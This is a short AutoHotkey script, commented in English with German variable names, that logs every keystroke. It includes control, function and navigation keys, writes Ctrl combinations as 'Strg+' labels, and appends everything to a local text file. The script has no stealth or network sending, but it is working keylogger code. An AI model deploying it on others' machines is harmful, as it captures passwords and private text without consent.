#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
#SingleInstance
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.
Loop
{
	Einzeltaste:=
	Input, Einzeltaste,M V L1, {LControl}{RControl}{LAlt}{RAlt}{LShift}{RShift}{LWin}{RWin}{AppsKey}{F1}{F2}{F3}{F4}{F5}{F6}{F7}{F8}{F9}{F10}{F11}{F12}{Left}{Right}{Up}{Down}{Home}{End}{PgUp}{PgDn}{Del}{Ins}{BS}{Capslock}{Numlock}{PrintScreen}{Pause}{Enter}{Return}{Esc}
	If (Einzeltaste <> "") && ((A := Asc(Einzeltaste)) < 27)
		Einzeltaste := "Strg+" . Chr(A + 64)
	If (InStr(ErrorLevel, "EndKey:") and Einzeltaste="")
	{
		StringReplace,Einzeltaste,ErrorLevel,EndKey:
		Einzeltaste:=A_Space Einzeltaste A_Space
	}
	FileAppend,%Einzeltaste%,EinzeltasteNow.txt
}